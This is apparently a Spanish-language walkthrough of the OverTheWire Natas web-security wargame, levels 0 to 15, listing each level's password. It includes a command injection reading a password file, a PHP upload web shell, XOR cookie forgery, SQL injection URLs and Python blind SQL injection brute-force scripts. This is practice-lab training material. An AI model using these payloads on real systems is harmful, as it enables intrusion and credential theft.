# natas0

http://natas0.natas.labs.overthewire.org
natas0
natas0

# natas1

natas1
gtVrDuiDfck831PqWsLEZy5gyDz1clto

# natas2

natas2
ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi

# natas3

natas3
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
eve:zo4mJWyNj2
mallory:9urtcpzBmH

# natas4

<!-- No more information leaks!! Not even Google will find it this time... -->

Google: site:natas3.natas.labs.overthewire.org

directory listing - OverTheWire
natas3.natas.labs.overthewire.org/s3cr3t/

Index of /s3cr3t
[ICO]	Name	Last modified	Size	Description
[PARENTDIR]	Parent Directory	 	- 	 
[TXT]	users.txt	2016-06-25 12:43 	40 	 
Apache/2.4.7 (Ubuntu) Server at natas3.natas.labs.overthewire.org Port 80

natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ

Nota: ojo al `robots.txt`:

```
User-agent: *
Disallow: /s3cr3t/
```

# natas5

 Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"

curl --user natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ -H "Referer:http://natas5.natas.labs.overthewire.org/" http://natas4.natas.labs.overthewire.org/

Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq

# natas5

tamper data: login=1

 Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1

# natas6

http://natas6.natas.labs.overthewire.org/includes/secret.inc

<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>

 Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9

# natas7

http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8

DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe

# natas8

Crear un script que invierta los pasos:

<?php
$encodedSecret = "3d3d516343746d4d6d6c315669563362";
print base64_decode(strrev(hex2bin($encodedSecret))) . "\n";
?>

 Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl

# natas9

En el cuadro de búsqueda:
asdf; cat /etc/natas_webpass/natas10

Output:

nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu

# natas10

En el cuadro de búsqueda:
. /etc/natas_webpass/natas11

/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK

Obviamente valdría lo mismo en la anterior :)

# natas11

Pista:
*"Cookies are protected with XOR encryption"*

Mediante tamper data vemos que la cookie "por defecto" es:
`ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=`

Como tenemos la fuente, sabemos que la cookie "protegida" se compone así:

1. json_encode(array con los datos)
2. xor con una clave desconocida
3. base64_encode

Por las propiedades de XOR sabemos que:
`a XOR b = c => a XOR c  = b`

Eso quiere decir que si pasamos los datos cifrados como clave del XOR, tendremos la clave. Para ello basta con modificar ligeramente el código que disponemos:

```
<?php
function xor_encrypt($in) {
    $key = json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff"));
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
        $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

$default_cookie='ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=';
$d = base64_decode($default_cookie);
print xor_encrypt($d) . "\n";
?>
```

Y ejecutamos:
```
php xor.php
qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq
```

La key es `qw8J`

Ahora, conocida la clave, podemos modificar la cookie a voluntad, indicando `showpassword = yes`

```
<?php
function xor_encrypt($in) {
    $key = 'qw8J';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
        $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

$c = json_encode(array( "showpassword"=>"yes", "bgcolor"=>"#ffffff"));
print base64_encode(xor_encrypt($c)) . "\n";
?>
```

The password for natas12 is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3

# natas12

Se sube un fichero ".jpg", pero no se verifica (puede ser cualquier cosa, inyección de ficheros). Se guarda con nombre aleatorio en upload/<10chars>.jpg

Sin embargo, nombre y extensión van en un campo *hidden* del formulario; basta con alterarlo (cambiar `.jpg` por `.php`) y ejecutar el fichero subido con este contenido:

<?php
  system("cat /etc/natas_webpass/natas13");
?>

Resultado:
jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY

# natas13

Muy similar, pero esta vez hay que subir realmente un fichero .jpg. Basta con añadir el código al final y alterar la extensión de la misma manera.

El resutaldo es:
Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1

# natas14

Inyección SQL

http://natas14.natas.labs.overthewire.org/?debug&username=user%22or%20%221%22=%221&password=asdf%22or%20%221%22=%221&debug

 Executing query: SELECT * from users where username="user"or "1"="1" and password="asdf"or "1"="1"
Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J

# natas15

Blind SQL injection. Toca hacer fuerza bruta, mejor con python.

Hago una ñapa con un script en dos pasadas. En la primera, miro qué caracteres hay mediante una consile like %char%:

```
#!/usr/bin/env python
import requests

# 'username': "natas15"
# 'password': "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"

def is_true(p):
    url = "http://natas15.natas.labs.overthewire.org?debug"
    headers = {"Authorization": "Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg=="}
    payload = {'username': 'natas16" and password like binary "%' + p +'%', 'debug': 'yes'}

    r = requests.post(url, data=payload, headers=headers )

    # print r.text
    if "exists" in r.text:
        return True

# 1st pass
chars = ""
for i in map(chr, range(65, 91) + range(97,123) + range(48, 58)):
   if is_true(i):
       chars = chars + i
print chars
```

Con esto construyo la lista de caracteres que aparecen en la password: `chars = "BEHINORWacehijmnpqtw03569"`

Ahora puedo hacer una segunda pasada iterando por la lista de esos caracteres:

```
#!/usr/bin/env python
import requests

# 'username': "natas15"
# 'password': "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"

def is_true(p):
    url = "http://natas15.natas.labs.overthewire.org?debug"
    headers = {"Authorization": "Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg=="}
    # payload = {'username': 'natas16" and password like binary "%' + p +'%', 'debug': 'yes'}
    payload = {'username': 'natas16" and password like binary "' + p +'%', 'debug': 'yes'}

    r = requests.post(url, data=payload, headers=headers )

    # print r.text
    if "exists" in r.text:
        return True

# 1st pass
# chars = ""
# for i in map(chr, range(65, 91) + range(97,123) + range(48, 58)):
#     if is_true(i):
#         chars = chars + i
# print chars

chars = "BEHINORWacehijmnpqtw03569"
i=1
passwd = ""
while len(passwd) < 32:
    for c in chars:
        if is_true(passwd + c):
            passwd = passwd + c
            print passwd
```

Ejecuto:

W
Wa
WaI
WaIH
WaIHE
WaIHEa
WaIHEac
WaIHEacj
WaIHEacj6
[...]

natas15 : WaIHEacj63wnNIBROHeqi3p9t0m5nhmh

# natas16
